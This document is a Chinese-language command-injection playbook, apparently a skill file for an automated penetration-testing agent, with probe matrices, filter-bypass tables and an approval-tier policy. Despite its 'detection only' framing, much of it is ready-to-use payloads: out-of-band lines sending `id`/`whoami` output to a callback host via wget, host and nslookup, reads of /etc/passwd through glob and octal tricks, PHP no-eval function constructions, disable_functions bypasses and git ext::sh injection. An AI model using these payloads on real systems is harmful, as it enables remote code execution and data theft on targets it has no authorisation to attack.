---
id: cmdi-deep
title: 命令注入深度手册（管道/分隔符/盲注/带外）
tags: cmdi,命令注入,rce,回连,s4,s5
---
# 命令注入深度手册

> 前置：injection-points（入口完整性）+ oob_check（v7.0.0 引擎工具：回连通道自检，盲态载荷回连经 oob_poll 收取）。**验证全程无害判据；确证 RCE 后利用级动作转 S5 审批**。

## 一、语法探针矩阵（按操作系统分族）

```bash
# 拼接分隔符族（Linux）：; | ` `` $( ) \n || &&
# 拼接分隔符族（Windows）：& | || %0a
# 无回显判据：ping -c 2 127.0.0.1（时间差）；curl http://<oob回连>/cmdi（带外确证）
# 算术探针（Linux）：`expr 3 - 1` / $(echo 3-1 | bc) → 响应含 2 = 确证
# 引号逃逸探测：值被引号包裹时先闭合：" 1; probe #  / ' 1' ; probe #
```

- 单变量原则：基线原样请求 vs 只改注入位；每组 2 遍排除抖动。
- 时间盲注先排除网络抖动：同请求无注入位对照跑 3 次取基线。

## 二、常见过滤场景与等价变换（检测用，非利用）

| 过滤特征 | 等价探针 |
|---|---|
| 禁空格 | `${IFS}` / `$IFS$9` / `%09`（tab） |
| 禁管道/分号 | 换行 `%0a`；`$( )` 子命令 |
| 禁关键字（cat/ls） | 通配符 `/bin/c?t *`、变量拼接 `a=c;b=at;$a$b`（仅判据层） |
| 编码过滤 | URL 双编码/Unicode 转义按网关行为试（配合 waf-fingerprint） |
| 黑名单全量 | 尝试 base64 解码执行判据 `echo Y3VybA== | base64 -d`（存在性判据） |

## 三、高危形态识别（只记录不利用）

- **上传文件名注入**（文件名进 shell：mv/convert 处理链）→ filename 探针。
- **归档处理注入**（tar/zip 文件名回车符 → 参数分隔）→ 构造带 `\n` 文件名的无害压缩包探测。
- **邮件/导出功能注入**（shell 元字符进 sendmail/imagemagick）→ 对应参数探针。

## 四、纪律

- 确证（回连/时间/算术双判据）→ record_finding（cwe-78，注明 OS 语境与可执行边界）。
- 利用级（反弹 shell/写文件/提权探测）→ S5 审批执行，本手册不固化载荷。

## 五、Execution Profile 分层（v5.3.2，与 sqli-deep 同口径——v6.4.0 S4-⑭ 补节）

- **production_safe（默认）**：本手册全部探针按存在性证明口径执行（无害回连/算术/时延双判据）；「disable_functions 六路径」「组件级 RCE」「EXP 回显截取」「批量遍历」等利用级配方**只作面识别与登记**（record_finding exploitability=untested / record_vt 待 S5），不在本阶段投递。
- **isolated_lab（项目显式声明）**：利用级配方可在受控环境完整验证（快照可恢复前提），投递前仍走审批矩阵；载荷原文留证据文件。
- M6 通道声明：本技能涉及 cmdi 探针与 OOB 回连——chain-proxy/盲注裁决按 sqli-deep 同款通道纪律执行（挑战型 WAF 先 chain-proxy 快照再批量）。

## disable_functions 六路径与组件注入

- LD_PRELOAD+mail()；Shellshock putenv；.htaccess+mod_cgi；PHP-FPM phuip-fpizdam（PHP_VALUE=auto_prepend_file）；Windows COM WScript.Shell；ImageTragick MVG `fill 'url(..."|id)'`
- iconv CVE-2024-2961（php://filter/convert.iconv 前缀链）+ FFI::cdef 兜底
- **PHP 免 eval 构造**：XOR `$_=('%01'^'\\`')...`；`base64_decode('c3lzdGVt')('id')`；`sys/*x*/tem`
- **cat 替代 13 命令**与 glob：`/???/??t /???/p??s??`、`cat$IFS`、`{cat,/etc/passwd}`、`X=$'\x20'`
- 组件级：Elasticsearch Groovy `script_fields` RCE；FFmpeg m3u8 concat 读文件；wkhtmltopdf/WeasyPrint SSRF/RCE
- Windows 延时：`waitfor /T 5 signal777`；环境变量注入：putenv 可控+后续 system → BASH_ENV/ENV/PS1/PROMPT_COMMAND/BASH_FUNC_xxx%%（Shellshock 变体，机制=glibc popen→sh -c 读 ENV）

### OOB 第三通道与回连带数据
无外联出网时：`; id > /var/www/html/RANDOM.txt` → 随后 GET 该路径读结果。回连带数据（本机通道可用时）：Windows `& nslookup %USERNAME%.<oob>`；Linux `; host \\`whoami\\`.<oob>`、`; wget http://<oob>/$(id|base64)`。斜杠过滤：`$'\057'etc$'\057'passwd`（八进制）、`cat /???/???sec???`（文件级 glob）。chr/rot13 拼函数名：`str_rot13('flfgrz')('id')`、`chr(115).chr(121)...`。注入入口补充：网络诊断页（ping/traceroute/whois 表单）、日志查看位（tail/grep 参数）、搜索/排序参数进 grep/find、备份还原路径参数、CI/CD "Run test" 钩子、git clone 用户可控 URL（`ext::sh -c ...`）+ git hooks、ASP 白盒 `szCMD="type C:\logs\" & Request.Form("FileName")` + `WScript.Shell.Run`。env 注入验证命令：`ENV='$(id 1>&2)' dash -i -c 'echo hello'`；`env 'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"`。EXP 回显截取：定位 `<br><pre>` 起始偏移 b，`resp.text[b:]` 即命令回显；批量=同目录 url.txt + with open 遍历。